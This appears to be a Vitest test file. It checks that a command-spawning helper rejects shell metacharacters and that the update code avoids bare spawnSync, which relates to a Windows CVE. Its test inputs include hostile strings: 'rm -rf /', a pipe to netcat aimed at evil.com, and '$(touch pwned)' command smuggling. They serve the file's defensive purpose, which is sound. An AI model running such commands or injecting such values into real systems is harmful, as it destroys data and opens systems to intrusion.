import { describe, it, expect } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import { spawnCmdSync } from "../../src/lib/spawn-cmd.js";

const REPO_ROOT = path.resolve(__dirname, "..", "..");

describe("spawnCmdSync — cross-platform safety (#61, #62, #63, #66, #67)", () => {
  it("refuses cmd with shell metacharacters", () => {
    expect(() => spawnCmdSync("npm; rm -rf /", ["foo"])).toThrow(/metacharacters/);
    expect(() => spawnCmdSync("npm | nc evil.com 9999", ["foo"])).toThrow(/metacharacters/);
    expect(() => spawnCmdSync("npm$(touch pwned)", ["foo"])).toThrow(/metacharacters/);
  });

  it("refuses any arg with shell metacharacters", () => {
    expect(() => spawnCmdSync("npm", ["i", "; rm -rf /"])).toThrow(/metacharacters/);
    expect(() => spawnCmdSync("npm", ["i", "$(touch pwned)"])).toThrow(/metacharacters/);
  });

  it("runs a benign command end-to-end", () => {
    // node prints its own version to stdout — universally available.
    const r = spawnCmdSync("node", ["--version"]);
    expect(r.status).toBe(0);
    expect((r.stdout ?? "").toString()).toMatch(/^v\d+\.\d+\.\d+/);
  });
});

describe("update.ts and update-check.ts — must not use bare spawnSync for npm/vegastack", () => {
  // Why: fixing #61/62/63/66/67 means the call sites delegate to spawnCmdSync,
  // which handles the Windows .cmd-shim CVE-2024-27980 case. A future commit
  // that reverts to bare spawnSync("npm", ...) would silently re-break
  // Windows. This architectural test pins the contract.
  it("src/commands/update.ts goes through spawnCmdSync for npm/vegastack", () => {
    const src = fs.readFileSync(path.join(REPO_ROOT, "src/commands/update.ts"), "utf8");
    // Strip line comments so doc strings can mention spawnSync.
    const code = src.replace(/^\s*\/\/.*$/gm, "").replace(/\/\*[\s\S]*?\*\//g, "");
    expect(code).not.toMatch(/spawnSync\(\s*["'](npm|vegastack)["']/);
  });

  it("src/lib/update-check.ts goes through spawnCmdSync for npm", () => {
    const src = fs.readFileSync(path.join(REPO_ROOT, "src/lib/update-check.ts"), "utf8");
    const code = src.replace(/^\s*\/\/.*$/gm, "").replace(/\/\*[\s\S]*?\*\//g, "");
    expect(code).not.toMatch(/spawnSync\(\s*["']npm["']/);
  });
});
